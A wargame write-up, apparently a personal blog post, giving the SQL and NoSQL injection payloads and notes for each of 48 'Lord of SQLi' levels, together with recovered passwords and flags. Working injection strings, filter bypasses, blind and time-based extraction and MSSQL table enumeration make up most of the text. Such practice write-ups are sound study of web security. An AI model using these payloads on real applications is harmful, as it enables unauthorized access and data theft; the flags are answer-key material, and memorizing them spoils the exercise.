---
title: ["Lord of SQLi"]
date: 2024-10-01 09:00:00 +0900
categories: [writeup, los]
tags: [web, los, lord of sqli]
---

![자료](assets/img/writeup/los/los_all_clear.png)

Lord of SQLInjection 올클 기념으로 작성하는 문제별 포인트 정리  
(근데 이제 웹린이의 삽질을 곁들인..)  


### 1 GREMLIN
pw='or'1'='1 %27%20or%20%271%27=%271%27%20--%20

Some SQL parsers might not interpret -- if there is no space after.

### 2 COBOLT
id=admin%27%20--%20

### 3 GOBLIN
%27, &apos, &#39, \u0027, char(39) doesn't work.  
bypassing quote filter doesn't work -> have to think some other way to query admin.

no=2%20or%20no=2

### 4 ORC
pw=1' or id='admin'-- doesn't work.  
It is converted to pw=1' or id='admin'-- by addslashes function.  
It was not possible to find a way to bypass addslashes function.  

1' or id='admin' and length(pw)=8 -- '  
I found the pw length. It is possible to bruteforce 8 chars.  

REL [orc.py](https://github.com/seolaf/lord-of-sqli/blob/main/4_orc.py), pw=095a9852

### 5 WOLFMAN
Can't use whitespace.  
tab(%09) works.  
Also, LF(%0a), CR(%0d), /**/ works.  

1%27%09or%09id=%27admin%27%09--%09

### 6 DARKELF
OR can be used as ||, AND can be used as &&  
However, && should be inputed as URL encoding form(%26).  

`' || id='admin`

### 7 ORGE
Combination of #4 and #6.  

REL [orge.py](https://github.com/seolaf/lord-of-sqli/blob/main/7_orge.py), pw=7b751aec

### 8 TROLL
Trapped in bypassing single quote filter, but never worked. (cost 2+ Hours..)  
It was quite simple quiz, that just bypass admin string filter.  

ad\min, ADmin, ...

### 9 VAMPIRE
same.  

ad\min works great.

### 10 SKELETON
easiest quiz.  

' or id='admin' --

### 11 GOLEM
substr and = are not allowed.  
I was able to use 'LIKE'.  
However, it has one problem.  
Like are not case sensitive, so that my codes always return capitalized word.  

We can use mid() instead of substr() :)  
REL [golem.py](https://github.com/seolaf/lord-of-sqli/blob/main/11_golem.py)

### 12 DARKKNIGHT
1' and no=1 or no LIKE "2"  
We can find the no of admin.  

using same solution of #11, easily solved.  
REL [darknight.py](https://github.com/seolaf/lord-of-sqli/blob/main/12_darknight.py)

### 13 BUGBEAR
I did find the way in a second, using STRCMP and mid  
but, I kept 'no' variable empty.  
1\n||\nSTRCMP(id,"admin")\nIS\nFALSE\n&&\nSTRCMP(mid(pw,{i},1),char({j}))\nIS\nFALSE  
must give a parameter to equal variables.  

REL [bugbear.py](https://github.com/seolaf/lord-of-sqli/blob/main/13_bugbear.py), pw=52dc3991

### 14 GIANT
%0b %0c -> space!  

REL [giant.py](https://github.com/seolaf/lord-of-sqli/blob/main/14_giant.py)

### 15 ASSASSIN
cutie quiz.  
use % and _ to guess the pw.  

pw=%d__

### 16 SUCCUBUS
&pw=or 1=1 --  

using escape function!

### 17 ZOMBIE_ASSASSIN
"&pw=%20--%201=1%20ro  

using escape function!  

### 18 NIGHTMARE
pw=')=0;%00  
We can use double equation on this problem.  

pw=''=0 is interpreted as False=0 so it is true.  
and ;%00 is kind of delimiting sql query.  

### 19 XAVIS
It may not be ascii.  
length(substr(pw,1,1))=4  
It was an unicode  

REL [xavis.py](https://github.com/seolaf/lord-of-sqli/blob/main/19_xavis.py)
pw=우왕굳

There was some brilliant approach.  
(select @a:=pw where id='admin') union select @a  

### 20 DRAGON
quite annoying problem.  
Had to escape comment.  
The only wayt to escape comment is to end line.  

and pw=' and pw='' or id='admin' -- '  
so the query would be interpreted like,  
select id from prob_dragon where id='guest'# and pw='  
and pw='' or id='admin'  

### 21 IRON_GOLEM
filtering sleep was a big HINT!!!  
I need to conduct Error Based Blind SQLI.  
length of password was 32.  

REL [iron_golem.py](https://github.com/seolaf/lord-of-sqli/blob/main/21_iron_golem.py), pw=06b5a6c16e8830475f983cc3a825ee9a

### 22 DARK_EYES
error based blind sqli using (select 1 union select )  

REL [dark_eyes.py](https://github.com/seolaf/lord-of-sqli/blob/main/22_dark_eyes.py)

### 23 HELL_FIRE
order by can get multiple arguments  
we can use "order by email='**'" as if phrase.  

REL [hell_fire.py](https://github.com/seolaf/lord-of-sqli/blob/main/23_hell_fire.py)

### 24 EVIL_WIZARD
same with 23.  

REL [evil_wizard.py](https://github.com/seolaf/lord-of-sqli/blob/main/24_evil_wizard.py)

### 25 GREEN_DRAGON
&pw=%20union%20select%200x5c,   0x756e696f6e2073656c65637420636861722839372c3130302c3130392c3130352c3131302923%23

prob_green_dragon table was empty.  
Need to put data using union select. TWICE.  
But, maybe due to interpreting method, we need to use ascii code when inputing twice.  
and ofcourse we can bypass single quote filtering by using CHAR()  

### 26 RED_DRAGON
SELECT id FROM prob_red_dragon WHERE id=''||no>#' and no=\n1000  
can bypass is_numeric  
no can be guessed by binary search.  

REL [red_dragon.py](https://github.com/seolaf/lord-of-sqli/blob/main/26_red_dragon.py)

### 27 BLUE_DRAGON
REL [blue_dragon.py](https://github.com/seolaf/lord-of-sqli/blob/main/27_blue_dragon.py)

### 28 FRANKENSTEIN
REL [frankenstein.py](https://github.com/seolaf/lord-of-sqli/blob/main/28_frankenstein.py)

### 29 PHANTOM
At first, I thought inserting no, ip, (select email from prob_phantom where no=1) works.  
But it didn't. I had to rename the table like "from prob_phantom as p" and my vpn keep changing my ip so, i have to manually throw the request.  

It is not neccessary to use "as" it's possible to use "from prob_phantom tmp"

### 30 OUROBOROS
using quine code.  

a' union select replace(replace('a" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw%23',char(34),char(39)),char(36),'a" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw%23') as pw%23

### 31 ZOMBIE
using information_schema.processlist  

1' union select substr(info,locate('1',info),length(info)-locate('1',info)) from information_schema.processlist#  

### 32 ALIEN
REL [alien.py](https://github.com/seolaf/lord-of-sqli/blob/main/32_alien.py)

### 33 CTHULHU
-1'<@=1 or {a 1}=1 or '  

### 34 DEATH
-1'<@=1 or id like 'ad%' or '

### 35 GODZILLA
-1'<@=1 or length(pw)=8 or '

### 36 CYCLOPS
-1'<@=1 union/**/select 'first', 'second'#

### 37 CHUPACABRA
' or id='admin

### 38 MANTICORE
admin' or id=char(97,100,109,105,110)--%20

### 39 BANSHEE
1' or substr(pw,2,1)='4' -- '  

REL [banshee.py](https://github.com/seolaf/lord-of-sqli/blob/main/39_banshee.py)

### 40 POLTERGEIST
' union select name from sqlite_master -- '  
flag_70c81d99  
' union select * from flag_70c81d99 -- '  

FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}

### 41 NESSIE
admin' and pw='' or id='admin' and pw=1 -- '  
select id from prob_nessie where id='admin' and 1=(case when len(pw)=16 then 's' end) -- ' and pw=''  

115d8d1a422f1f3e

### 42 REVENANT
admin' and pw='' or id='admin' and pw=1 -- '  

bae18ae1221fafd3

### 43 YETI
' if((select len(pw) from prob_yeti where id='admin')=16) waitfor delay '0:0:3' -- '  

REL [yeti.py](https://github.com/seolaf/lord-of-sqli/blob/main/43_yeti.py)

### 44 mummy
using [] works!!  
select[pw]from[prob_mummy]where[id]='admin'and[pw]like'________________'  

REL [mummy.py](https://github.com/seolaf/lord-of-sqli/blob/main/44_mummy.py)

### 45 KRAKEN
```
1' union select name from sysobjects where xtype='U' -- '
: flag_34d1a7f3bb77c91e
1' union select id from sysobjects where name='flag_34d1a7f3bb77c91e' -- '
: 597577167
1' union select name from syscolumns where id=597577167 -- '
: wrongflag <-------------- fucking trap
1' union select name from syscolumns where id=597577167 and name <>'wrongflag' -- '
: there was no output!!! may be flag is on other table....
1' union select name from sysobjects where name<>'flag_34d1a7f3bb77c91e' and xtype='U' -- '
: flag_a98fbc3d1d46a81e
1' union select id from sysobjects where name='flag_a98fbc3d1d46a81e' -- '
: 613577224
1' union select name from syscolumns where id=613577224 -- '
: flag
1' union select flag from flag_a98fbc3d1d46a81e -- '
: FLAG{a0819fc56beae985bac7d175c974cd27}
```

GOOD reference about mssql : [https://whatdocumentary.tistory.com/8](https://whatdocumentary.tistory.com/8)

### 46 CERBERUS
id=admin&pw[$ne]=null

### 47 SIREN
id=admin&pw[$regex]=^.{8}$  

REL [siren.py](https://github.com/seolaf/lord-of-sqli/blob/main/47_siren.py)

### 48 INCUBUS
' || obj.id=='admin'&&obj.pw.length==8 ? not : '1';}"}  

REL [incubus.py](https://github.com/seolaf/lord-of-sqli/blob/main/48_incubus.py)

